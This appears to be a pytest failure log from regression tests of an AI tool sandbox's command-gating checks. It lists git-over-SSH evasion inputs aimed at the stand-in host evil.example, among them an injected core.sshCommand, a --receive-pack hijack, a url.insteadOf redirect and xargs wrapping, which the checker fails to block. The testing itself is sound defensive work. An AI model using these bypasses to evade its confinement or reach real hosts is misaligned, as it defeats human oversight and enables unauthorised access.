@@ -1,0 +1,100 @@
+FFFFFFFFFFFFFF.........F                                                 [100%]
+=================================== FAILURES ===================================
+_ test_git_ssh_requires_explicit_destination[git -c core.sshCommand='ssh -F none' ls-remote ssh://evil.example/repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access("git -c core.sshCommand='ssh -F none' ls-remote ssh://evil.example/repo", 'round20')
+_ test_git_ssh_requires_explicit_destination[git clone deploy@evil.example:repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git clone deploy@evil.example:repo', 'round20')
+_ test_git_ssh_requires_explicit_destination[git clone --template /tmp ssh://evil.example/repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git clone --template /tmp ssh://evil.example/repo', 'round20')
+_ test_git_ssh_requires_explicit_destination[git push --receive-pack /tmp/receiver evil.example:repo main] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git push --receive-pack /tmp/receiver evil.example:repo main', 'round20')
+_________ test_git_ssh_requires_explicit_destination[git fetch origin] _________
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git fetch origin', 'round20')
+_____________ test_git_ssh_requires_explicit_destination[git pull] _____________
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git pull', 'round20')
+___ test_git_ssh_requires_explicit_destination[git -C repo push origin main] ___
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git -C repo push origin main', 'round20')
+________ test_git_ssh_requires_explicit_destination[git remote update] _________
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git remote update', 'round20')
+___ test_git_ssh_requires_explicit_destination[git submodule update --init] ____
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git submodule update --init', 'round20')
+_ test_git_ssh_requires_explicit_destination[git archive --remote=ssh://evil.example/repo HEAD] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git archive --remote=ssh://evil.example/repo HEAD', 'round20')
+_ test_git_ssh_requires_explicit_destination[git --config-env=core.sshCommand=SSH ls-remote ssh://evil.example/repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git --config-env=core.sshCommand=SSH ls-remote ssh://evil.example/repo', 'round20')
+_ test_git_ssh_requires_explicit_destination[git -c url.ssh://evil.example/.insteadOf=https://safe.example/ clone https://safe.example/repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('git -c url.ssh://evil.example/.insteadOf=https://safe.example/ clone https://safe.example/repo', 'round20')
+_ test_git_ssh_requires_explicit_destination[env git ls-remote ssh://evil.example/repo] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('env git ls-remote ssh://evil.example/repo', 'round20')
+_ test_git_ssh_requires_explicit_destination[printf '%s' ssh://evil.example/repo | xargs git ls-remote] _
+/evidence/round20_regressions.py:24: in test_git_ssh_requires_explicit_destination
+    assert check_ssh_command_access(command,'round20') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access("printf '%s' ssh://evil.example/repo | xargs git ls-remote", 'round20')
+______________________ test_python_git_launcher_is_gated _______________________
+/evidence/round20_regressions.py:37: in test_python_git_launcher_is_gated
+    assert _check_code_safety("import subprocess; subprocess.run(['git','ls-remote','ssh://evil.example/repo'])",session_id='round20') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import subprocess; subprocess.run(['git','ls-remote','ssh://evil.example/repo'])", session_id='round20')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git -c core.sshCommand='ssh -F none' ls-remote ssh://evil.example/repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git clone deploy@evil.example:repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git clone --template /tmp ssh://evil.example/repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git push --receive-pack /tmp/receiver evil.example:repo main]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git fetch origin]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git pull]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git -C repo push origin main]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git remote update]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git submodule update --init]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git archive --remote=ssh://evil.example/repo HEAD]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git --config-env=core.sshCommand=SSH ls-remote ssh://evil.example/repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[git -c url.ssh://evil.example/.insteadOf=https://safe.example/ clone https://safe.example/repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[env git ls-remote ssh://evil.example/repo]
+FAILED ../evidence/round20_regressions.py::test_git_ssh_requires_explicit_destination[printf '%s' ssh://evil.example/repo | xargs git ls-remote]
+FAILED ../evidence/round20_regressions.py::test_python_git_launcher_is_gated
+15 failed, 9 passed, 1 warning in 0.14s
